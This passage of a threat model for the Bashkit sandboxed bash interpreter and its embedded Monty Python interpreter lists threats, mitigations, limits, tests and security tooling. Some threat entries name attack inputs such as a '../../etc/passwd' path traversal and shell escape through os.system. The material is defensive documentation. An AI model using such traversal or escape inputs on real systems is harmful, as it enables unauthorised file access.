|--------|-----------|---------------|--------|
| V1 | TM-DOS-001 | Large script input | **MITIGATED** via `max_input_bytes` |
| V2 | TM-DOS-002 | Output flooding | **MITIGATED** via command limits |
| V3 | TM-DOS-024 | Parser hang | **MITIGATED** via `parser_timeout` + `max_parser_operations` |
| V4 | TM-DOS-022 | Parser recursion | **MITIGATED** via `max_ast_depth` |
| V5 | TM-DOS-018 | Nested loop multiplication | **MITIGATED** via `max_total_loop_iterations` (1M) |
| V6 | TM-DOS-021 | Command sub parser limit bypass | **MITIGATED** via inherited depth/fuel |
| V7 | TM-DOS-026 | Arithmetic recursion overflow | **MITIGATED** via `MAX_ARITHMETIC_DEPTH` (200) |

### Open (Medium Priority)

| Threat ID | Vulnerability | Impact | Recommendation |
|-----------|---------------|--------|----------------|
| TM-INF-001 | Env vars may leak secrets | Information disclosure | Document caller responsibility |
| TM-INJ-008 | Terminal escapes in output | UI manipulation | Document sanitization need |

### Accepted (Low Priority)

| Threat ID | Vulnerability | Impact | Rationale |
|-----------|---------------|--------|-----------|
| TM-DOS-011 | Symlinks not followed | Functionality gap | By design - prevents symlink attacks |
| TM-DOS-025 | Regex backtracking | CPU exhaustion | Regex crate has internal limits |

---

## Security Controls Matrix

| Control | Threat IDs | Implementation | Tested |
|---------|------------|----------------|--------|
| Input size limit (10MB) | TM-DOS-001 | `limits.rs` | Yes |
| Command limit (10K) | TM-DOS-002, TM-DOS-004, TM-DOS-019 | `limits.rs` | Yes |
| Loop limit (10K) | TM-DOS-016, TM-DOS-017 | `limits.rs` | Yes |
| Total loop limit (1M) | TM-DOS-018 | `limits.rs` | Yes |
| Function depth (100) | TM-DOS-020, TM-DOS-021 | `limits.rs` | Yes |
| Parser timeout (5s) | TM-DOS-024 | `limits.rs` | Yes |
| Parser fuel (100K ops) | TM-DOS-024 | `limits.rs` | Yes |
| AST depth limit (100) | TM-DOS-022 | `limits.rs` | Yes |
| Child parser limit propagation | TM-DOS-021 | `parser/mod.rs` | Yes |
| Arithmetic depth limit (200) | TM-DOS-026 | `interpreter/mod.rs` | Yes |
| Builtin parser depth limit (100) | TM-DOS-027 | `builtins/awk.rs`, `builtins/jq.rs` | Yes |
| Execution timeout (30s) | TM-DOS-023 | `limits.rs` | Yes |
| Virtual filesystem | TM-ESC-001, TM-ESC-003 | `fs/memory.rs` | Yes |
| Filesystem limits | TM-DOS-005 to TM-DOS-010, TM-DOS-014 | `fs/limits.rs` | Yes |
| Path depth limit (100) | TM-DOS-012 | `fs/limits.rs` | Yes |
| Filename length limit (255) | TM-DOS-013 | `fs/limits.rs` | Yes |
| Path length limit (4096) | TM-DOS-013 | `fs/limits.rs` | Yes |
| Path char validation | TM-DOS-015 | `fs/limits.rs` | Yes |
| Zip bomb protection | TM-DOS-007, TM-NET-013 | `builtins/archive.rs` | Yes |
| Path normalization | TM-ESC-001, TM-INJ-005 | `fs/memory.rs` | Yes |
| No symlink following | TM-ESC-002, TM-DOS-011 | `fs/memory.rs` | Yes |
| Network allowlist | TM-INF-010, TM-NET-001 to TM-NET-007 | `network/allowlist.rs` | Yes |
| Sandboxed eval/bash/sh, no exec | TM-ESC-005 to TM-ESC-008, TM-ESC-015, TM-INJ-003 | `interpreter/mod.rs` | Yes |
| Fail-point testing | All controls | `security_failpoint_tests.rs` | Yes |
| Builtin panic catching | TM-INT-001, TM-INT-002, TM-INT-006 | `interpreter/mod.rs` | Yes |
| Date format validation | TM-INT-003 | `builtins/date.rs` | Yes |
| Error message sanitization | TM-INT-004, TM-INT-005 | `error.rs` | Yes |
| HTTP response size limit | TM-NET-008, TM-NET-012 | `network/client.rs` | Yes |
| HTTP connect timeout | TM-NET-009 | `network/client.rs` | Yes |
| HTTP read timeout | TM-NET-010 | `network/client.rs` | Yes |
| No auto-redirect | TM-NET-011, TM-NET-014 | `network/client.rs` | Yes |
| Log value redaction | TM-LOG-001 to TM-LOG-004 | `logging.rs` | Yes |
| Log injection prevention | TM-LOG-005, TM-LOG-006 | `logging.rs` | Yes |
| Log value truncation | TM-LOG-007, TM-LOG-008 | `logging.rs` | Yes |
| Python subprocess isolation | TM-PY-022 | `builtins/python.rs` | Yes |
| Worker env clearing | TM-PY-025 | `builtins/python.rs` | Yes |
| IPC timeout | TM-PY-024 | `builtins/python.rs` | Yes |
| IPC line size limit | TM-PY-026 | `builtins/python.rs` | Yes |

---

## Recommended Limits for Production

All execution counters reset per `exec()` call. Each script invocation gets a fresh
budget; hitting a limit in one call does not affect subsequent calls on the same instance.

```rust
ExecutionLimits::new()
    .max_commands(10_000)              // Per-exec() (TM-DOS-002, TM-DOS-004, TM-DOS-019)
    .max_loop_iterations(10_000)       // TM-DOS-016, TM-DOS-017
    .max_total_loop_iterations(1_000_000) // TM-DOS-018 (nested loop cap)
    .max_function_depth(100)           // TM-DOS-020, TM-DOS-021
    .timeout(Duration::from_secs(30))  // TM-DOS-023
    .parser_timeout(Duration::from_secs(5))  // TM-DOS-024
    .max_input_bytes(10_000_000)       // TM-DOS-001 (10MB)
    .max_ast_depth(100)                // TM-DOS-022 (also inherited by child parsers: TM-DOS-021)
    .max_parser_operations(100_000)    // TM-DOS-024 (also inherited by child parsers: TM-DOS-021)
// Note: MAX_ARITHMETIC_DEPTH (200) is a compile-time constant in interpreter (TM-DOS-026)
// Note: MAX_AWK_PARSER_DEPTH (100) is a compile-time constant in builtins/awk.rs (TM-DOS-027)
// Note: MAX_JQ_JSON_DEPTH (100) is a compile-time constant in builtins/jq.rs (TM-DOS-027)

// Path validation limits (applied via FsLimits):
FsLimits::new()
    .max_path_depth(100)           // TM-DOS-012
    .max_filename_length(255)      // TM-DOS-013
    .max_path_length(4096)         // TM-DOS-013
// Note: validate_path() also rejects control chars and bidi overrides (TM-DOS-015)
```

---

## Caller Responsibilities

| Responsibility | Related Threats | Description |
|---------------|-----------------|-------------|
| Sanitize env vars | TM-INF-001 | Don't pass secrets to untrusted scripts |
| Use network allowlist | TM-INF-010, TM-NET-* | Default denies all network access |
| Sanitize output | TM-INJ-008 | Filter terminal escapes if displaying output |
| Set appropriate limits | TM-DOS-* | Tune limits for your use case |
| Isolate tenants | TM-ISO-001 to TM-ISO-003 | Use separate Bash instances per tenant |
| Keep log redaction enabled | TM-LOG-001 to TM-LOG-004 | Don't disable redaction in production |
| Secure worker binary path | TM-PY-023 | Don't let untrusted input control BASHKIT_MONTY_WORKER or PATH |

---

## Testing Coverage

| Threat Category | Unit Tests | Fail-Point Tests | Threat Model Tests | Fuzz Tests | Proptest |
|----------------|------------|------------------|-------------------|------------|----------|
| Resource limits | ✅ | ✅ | ✅ | ✅ | ✅ |
| Filesystem escape | ✅ | ✅ | ✅ | - | ✅ |
| Injection attacks | ✅ | ❌ | ✅ | ✅ | ✅ |
| Information disclosure | ✅ | ✅ | ✅ | - | - |
| Network bypass | ✅ | ❌ | ✅ | - | - |
| HTTP attacks | ✅ | ❌ | ✅ | - | - |
| Multi-tenant isolation | ✅ | ❌ | ✅ | - | - |
| Parser edge cases | ✅ | ❌ | ✅ | ✅ | ✅ |
| Custom builtin errors | ✅ | ✅ | ✅ | - | - |
| Logging security | ✅ | ❌ | ✅ | - | ✅ |

**Test Files**:
- `tests/threat_model_tests.rs` - 117 threat-based security tests
- `tests/security_failpoint_tests.rs` - Fail-point injection tests
- `tests/builtin_error_security_tests.rs` - Custom builtin error handling tests (39 tests)
- `tests/network_security_tests.rs` - HTTP security tests (53 tests: allowlist, size limits, timeouts)
- `tests/logging_security_tests.rs` - Logging security tests (redaction, injection)

**Recommendation**: Add cargo-fuzz for parser and input handling.

---

## Security Tooling

This section documents the security tools used to detect and prevent vulnerabilities in Bashkit.

### Static Analysis Tools

| Tool | Purpose | CI Integration | Frequency |
|------|---------|----------------|-----------|
| **cargo-audit** | CVE scanning for dependencies | ✅ Required | Every PR |
| **cargo-deny** | License + advisory checks | ✅ Required | Every PR |
| **cargo-clippy** | Lint with security-focused warnings | ✅ Required | Every PR |
| **cargo-geiger** | Count unsafe code blocks | ✅ Informational | Every PR |

**cargo-audit**: Scans `Cargo.lock` against RustSec Advisory Database for known vulnerabilities.
```bash
cargo audit
```

**cargo-geiger**: Tracks unsafe code usage to ensure it remains minimal and audited.
```bash
cargo geiger --all-features
```

### Dynamic Analysis Tools

| Tool | Purpose | CI Integration | Frequency |
|------|---------|----------------|-----------|
| **cargo-fuzz** | LibFuzzer-based fuzzing | ✅ Scheduled | Nightly/Weekly |
| **Miri** | Undefined behavior detection | ✅ Required | Every PR |
| **proptest** | Property-based testing | ✅ Required | Every PR |

**cargo-fuzz**: Finds crashes, hangs, and memory issues in parser and interpreter.
```bash
cargo +nightly fuzz run parser_fuzz -- -max_total_time=300
```

**Miri**: Detects undefined behavior in unsafe code blocks.
```bash
cargo +nightly miri test --lib
```

**proptest**: Generates random inputs to test invariants and boundary conditions.
```rust
proptest! {
    #[test]
    fn parser_handles_arbitrary_input(s in ".*") {
        // Should not panic on any input
        let _ = parse(&s);
    }
}
```

### Memory Safety Tools

| Tool | Purpose | When to Use |
|------|---------|-------------|
| **AddressSanitizer (ASAN)** | Memory errors, buffer overflow | Local testing, CI (optional) |
| **Miri** | UB detection in unsafe code | CI required |
| **cargo-careful** | Extra UB checks | Local development |

### Supply Chain Security

| Tool | Purpose | CI Integration |
|------|---------|----------------|
| **cargo-audit** | Known CVE detection | ✅ Required |
| **cargo-deny** | License compliance | ✅ Required |
| **Dependabot** | Automated dependency updates | GitHub-native |

### Fuzzing Targets

The following components are fuzz-tested for robustness:

| Target | File | Threats Mitigated |
|--------|------|-------------------|
| Parser | `fuzz/fuzz_targets/parser_fuzz.rs` | V3 (parser hang), V4 (parser recursion) |
| Lexer | `fuzz/fuzz_targets/lexer_fuzz.rs` | Tokenization crashes |
| Arithmetic | `fuzz/fuzz_targets/arithmetic_fuzz.rs` | Integer overflow, parsing errors |
| Pattern matching | `fuzz/fuzz_targets/glob_fuzz.rs` | Glob/regex DoS |

### Vulnerability Detection Matrix

| Vulnerability | cargo-audit | cargo-fuzz | Miri | proptest | ASAN |
|--------------|-------------|------------|------|----------|------|
| Known CVEs | ✅ | - | - | - | - |
| Parser crashes | - | ✅ | - | ✅ | ✅ |
| Stack overflow | - | ✅ | ✅ | - | ✅ |
| Buffer overflow | - | ✅ | ✅ | - | ✅ |
| Undefined behavior | - | - | ✅ | - | - |
| Integer overflow | - | ✅ | ✅ | ✅ | - |
| Infinite loops | - | ✅ | - | ✅ | - |
| Memory leaks | - | ✅ | - | - | ✅ |

---

## Python / Monty Security (TM-PY)

> **Experimental.** Monty is an early-stage Python interpreter that may have
> undiscovered crash or security bugs. Subprocess isolation mitigates host
> crashes, but this integration should be treated as experimental.

BashKit embeds the Monty Python interpreter (pydantic/monty) with VFS bridging.
Python `pathlib.Path` operations are bridged to BashKit's virtual filesystem via
Monty's OsCall pause/resume mechanism. This section covers threats specific to
the Python builtin.

### Architecture

```
Python code → Monty VM → OsCall pause → BashKit VFS bridge → resume
```

Monty never touches the real filesystem. All `Path.*` operations yield `OsCall`
events that BashKit intercepts and dispatches to the VFS.

### Threats

| ID | Threat | Severity | Mitigation | Test |
|----|--------|----------|------------|------|
| TM-PY-001 | Infinite loop via `while True` | High | Monty time limit (30s) + allocation cap | `threat_python_infinite_loop` |
| TM-PY-002 | Memory exhaustion via large allocation | High | Monty max_memory (64MB) + max_allocations (1M) | `threat_python_memory_exhaustion` |
| TM-PY-003 | Stack overflow via deep recursion | High | Monty max_recursion (200) + parser depth limit (200, since 0.0.4) | `threat_python_recursion_bomb` |
| TM-PY-004 | Shell escape via os.system/subprocess | Critical | Monty has no os.system/subprocess implementation | `threat_python_no_os_operations` |
| TM-PY-005 | Real filesystem access via open() | Critical | Monty has no open() builtin | `threat_python_no_filesystem` |
| TM-PY-006 | Error info leakage via stdout | Medium | Errors go to stderr, not stdout | `threat_python_error_isolation` |
| TM-PY-015 | Real filesystem read via pathlib | Critical | VFS bridge reads only from BashKit VFS, not host | `threat_python_vfs_no_real_fs` |
| TM-PY-016 | Real filesystem write via pathlib | Critical | VFS bridge writes only to BashKit VFS | `threat_python_vfs_write_sandboxed` |
| TM-PY-017 | Path traversal (../../etc/passwd) | High | VFS resolves paths within sandbox boundaries | `threat_python_vfs_path_traversal` |
| TM-PY-018 | Bash/Python VFS isolation breach | Medium | Shared VFS by design; no cross-tenant access | `threat_python_vfs_bash_python_isolation` |
| TM-PY-019 | Crash on missing file | Medium | FileNotFoundError raised, not panic | `threat_python_vfs_error_handling` |
| TM-PY-020 | Network access from Python | Critical | Monty has no socket/network module | `threat_python_vfs_no_network` |
| TM-PY-021 | VFS mkdir escape | Medium | mkdir operates only in VFS | `threat_python_vfs_mkdir_sandboxed` |
| TM-PY-022 | Parser/VM crash kills host | Critical | Parser depth limit (since 0.0.4) prevents parser crashes; subprocess isolation catches remaining VM crashes | `subprocess_worker_crash_via_false_binary` |
| TM-PY-023 | Worker binary spoofing via env var / PATH | Critical | Caller responsibility (like TM-INF-001); document risk | `threat_python_subprocess_worker_spoofing` |
| TM-PY-024 | Worker hang blocks parent (no IPC timeout) | High | IPC reads wrapped in `tokio::time::timeout` (max_duration + 5s) | `threat_python_subprocess_ipc_timeout` |
| TM-PY-025 | Worker inherits host environment | High | `env_clear()` on worker Command; env vars passed only via IPC | `threat_python_subprocess_env_isolation` |
| TM-PY-026 | Unbounded IPC response causes parent OOM | High | IPC line size capped at 16 MB | `threat_python_subprocess_ipc_line_limit` |

### VFS Bridge Security Properties

1. **No real filesystem access**: All Path operations go through BashKit's VFS.
   `/etc/passwd` in Python reads from VFS, not the host.
2. **Shared VFS with bash**: Files written by `echo > file` are readable by
   Python's `Path(file).read_text()`, and vice versa. This is intentional.
3. **Path resolution**: Relative paths are resolved against the shell's cwd.
   Path traversal (`../..`) is constrained by VFS path normalization.
4. **Error mapping**: VFS errors are mapped to standard Python exceptions
   (FileNotFoundError, IsADirectoryError, etc.), not raw panics.
5. **Resource isolation**: Monty's own limits (time, memory, allocations,
   recursion) are enforced independently of BashKit's shell limits.

### Subprocess Isolation (Crash Protection)

When `PythonIsolation::Subprocess` (or `Auto` with worker available), Monty runs
in a child process (`bashkit-monty-worker`). This isolates the host from parser
segfaults and other fatal crashes.

**IPC Architecture:**
```
Parent (bashkit)                  Child (bashkit-monty-worker)
     │                                      │
     │── Init {code, limits} ──────────────>│
     │                                      │── Parse + execute
     │<── OsCall {function, args} ─────────│   (pauses at VFS op)
     │── OsResponse {result} ──────────────>│
     │                                      │── Resume execution
     │<── Complete {result, output} ────────│
```

**Security properties:**
1. Worker crashes (SIGSEGV, SIGABRT) → parent gets child exit status, not crash
2. Worker env cleared (TM-PY-025): no host env var leakage
3. IPC timeout (TM-PY-024): worker hang → parent kills after max_duration + 5s
4. IPC line limit (TM-PY-026): max 16 MB per JSON line
5. VFS operations bridged through parent — worker never touches real filesystem

**Caller Responsibility (TM-PY-023):** The `BASHKIT_MONTY_WORKER` env var or
PATH ordering controls which binary is spawned. Callers must ensure these are
not attacker-controlled. This is analogous to TM-INF-001 (env var sanitization).

### Supported OsCall Operations

| Operation | VFS Method | Return Type |
|-----------|-----------|-------------|
| Path.exists() | fs.exists() | bool |
| Path.is_file() | fs.stat() | bool |
| Path.is_dir() | fs.stat() | bool |
| Path.is_symlink() | fs.stat() | bool |
| Path.read_text() | fs.read_file() | str |
| Path.read_bytes() | fs.read_file() | bytes |
| Path.write_text() | fs.write_file() | int |
| Path.write_bytes() | fs.write_file() | int |
| Path.mkdir() | fs.mkdir() | None |
| Path.unlink() | fs.remove() | None |
| Path.rmdir() | fs.remove() | None |
| Path.iterdir() | fs.read_dir() | list[Path] |
| Path.stat() | fs.stat() | stat_result |
| Path.rename() | fs.rename() | Path |
| Path.resolve() | identity (no symlink resolution) | Path |
| Path.absolute() | identity (no symlink resolution) | Path |
| os.getenv() | ctx.env lookup | str/None |
| os.environ | ctx.env dict | dict |

---

## References

- `specs/001-architecture.md` - System design
- `specs/003-vfs.md` - Virtual filesystem design
- `specs/005-security-testing.md` - Fail-point testing
- `specs/011-python-builtin.md` - Python builtin specification
- `src/builtins/system.rs` - Hardcoded system builtins
- `tests/threat_model_tests.rs` - Threat model test suite (117 tests)
- `tests/security_failpoint_tests.rs` - Fail-point security tests
